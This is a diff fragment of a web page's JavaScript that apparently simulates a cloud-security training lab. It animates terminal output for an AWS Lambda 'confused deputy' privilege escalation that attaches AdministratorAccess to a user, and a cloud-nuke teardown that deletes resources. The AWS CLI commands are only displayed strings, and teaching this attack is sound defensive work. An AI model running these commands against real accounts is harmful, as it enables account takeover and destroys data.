+  $$('[data-id="9.1"] .ocard').forEach(c=>c.classList.remove('sel','wrong'));
+  $('lre').classList.remove('vis');const t='t91';$(t).innerHTML='';
+  if(r==='mgr'){
+    el.classList.add('wrong');$('lre').classList.add('vis');$('bdep').disabled=true;
+    // Full simulated failure flow
+    aL(t,'aws sts assume-role --role-arn ...cg-lambdaManager --role-session-name mgr','cmd');
+    aL(t,'','out');aL(t,'Assumed cg-lambdaManager','ok');aL(t,'','out');
+    aL(t,'aws lambda create-function --function-name escalate_privs --runtime python3.9 --role ...cg-lambdaManager-role --handler lambda_escalate.lambda_handler','cmd');
+    aL(t,'','out');aL(t,'Function created','out');aL(t,'','out');
+    aL(t,'aws lambda invoke --function-name escalate_privs /tmp/out.txt','cmd');
+    aL(t,'','out');aL(t,sj({StatusCode:200,FunctionError:'Unhandled'}),'out');aL(t,'','out');
+    aL(t,'CloudWatch log output:','inf');aL(t,'','out');
+    aL(t,'[ERROR] ClientError: An error occurred (AccessDeniedException) when calling the AttachUserPolicy operation: User: arn:aws:sts::012345678901:assumed-role/cg-lambdaManager-role/escalate_privs is not authorized to perform: iam:AttachUserPolicy on resource: user chris-lambda_privesc_cgid','err');
+    aL(t,'','out');
+    aL(t,'The function ran, but AS lambdaManager. lambdaManager cannot modify IAM.','inf');
+    aL(t,'The confused deputy requires passing a DIFFERENT role (cg-debug) that has the needed permissions.','inf');
+    toast('Function failed — wrong execution role','error');return;
+  }
+  el.classList.add('sel');S.lamRole=r;$('bdep').disabled=false;toast('cg-debug — correct target','warning');
+}
+async function depLam(){$('lok').classList.remove('vis');$('bdep').disabled=true;$('b100').disabled=true;const t='t91';$(t).innerHTML='';await tL(t,'aws sts assume-role --role-arn ...cg-lambdaManager --role-session-name mgr','cmd',8);aL(t,'','out');await dly(600);aL(t,'Assumed lambdaManager','ok');aL(t,'','out');await tL(t,'aws lambda create-function --function-name escalate_privs --role ...cg-debug-role ...','cmd',7);aL(t,'','out');await dly(1000);aL(t,'Lambda created with cg-debug execution role','inf');aL(t,'','out');modal('Confirm Invocation','<p style="font-size:14px;color:var(--t2)">Invoke <code>escalate_privs</code>? It will run as <code>cg-debug</code> (AdminAccess) and attach AdministratorAccess to user chris.</p>','<button class="btn btng" onclick="cModal()">Cancel</button><button class="btn btn1" onclick="cModal();invLam()">Invoke →</button>')}
+async function invLam(){const t='t91';await tL(t,'aws lambda invoke --function-name escalate_privs /tmp/out.txt','cmd',12);aL(t,'','out');await dly(1200);aL(t,sj({StatusCode:200,ExecutedVersion:'$LATEST'}),'out');aL(t,'','out');aL(t,'aws iam list-attached-user-policies --user-name chris-lambda_privesc_cgid','cmd');await dly(600);aL(t,'','out');aL(t,sj({AttachedPolicies:[{PolicyName:'cg-chris-policy'},{PolicyName:'AdministratorAccess'}]}),'out');aL(t,'','out');aL(t,'AdministratorAccess attached — confused deputy complete','alrt');$('lok').classList.add('vis');$('b100').disabled=false;toast('Full account takeover!','error')}
+
+function initNk(){$('nd').classList.remove('vis');$('nc').classList.remove('vis');$('t10').innerHTML='';$('nr').value='';$('ni').value='';$('bn').disabled=true;$('ni').disabled=false;$('nre').classList.remove('vis');$('bkc').disabled=true;['i','c','e','s','l'].forEach(r=>{$(`nk-${r}`).style.width='0%';const s=$(`nk-${r}s`);s.textContent='—';s.style.color=''});$('nr').onchange=function(){$('nre').classList.remove('vis');if(this.value&&this.value!=='us-east-1'){$('nre').classList.add('vis');$('nc').classList.remove('vis');const t='t10';$(t).innerHTML='';aL(t,`cloud-nuke aws --region ${this.value}`,'cmd');aL(t,'','out');aL(t,'Scanning 119 resource types...','inf');aL(t,'','out');aL(t,'Found 0 resources. Region is clean.','out');toast(`No resources in ${this.value}`,'warning');return}if(this.value==='us-east-1'){$('nc').classList.add('vis');$('ni').focus()}};$('ni').oninput=function(){$('bn').disabled=this.value.trim().toLowerCase()!=='nuke'}}
+async function doNk(){$('ni').disabled=true;$('bn').disabled=true;const t='t10';$(t).innerHTML='';await tL(t,'cloud-nuke aws --region us-east-1','cmd',12);aL(t,'','out');await tL(t,'Scanning 119 resource types...','inf',18);await dly(1000);aL(t,'Found 14 resources','out');aL(t,'Deleting...','alrt');const rs=['i','c','e','s','l'];const dl=[1500,1000,1800,800,700];for(let i=0;i<rs.length;i++){$(`nk-${rs[i]}s`).textContent='⏳';await dly(300);$(`nk-${rs[i]}`).style.width='100%';await dly(dl[i]);$(`nk-${rs[i]}s`).textContent='✓';$(`nk-${rs[i]}s`).style.color='var(--g)';aL(t,`  ${['IAM','Cognito','EC2','S3','Lambda'][i]} deleted`,'ok')}aL(t,'','out');aL(t,'All destroyed','ok');$('nd').classList.add('vis');$('bkc').disabled=false;toast('Clean','success')}
+async function initKC(){$$('#kc .kcp').forEach(p=>p.classList.remove('vis'));const ps=$$('#kc .kcp');for(let i=0;i<ps.length;i++){await dly(500);ps[i].classList.add('vis')}}
+
+buildSB();buildScreens();nav('1');
 </script>
 </body>
 </html>
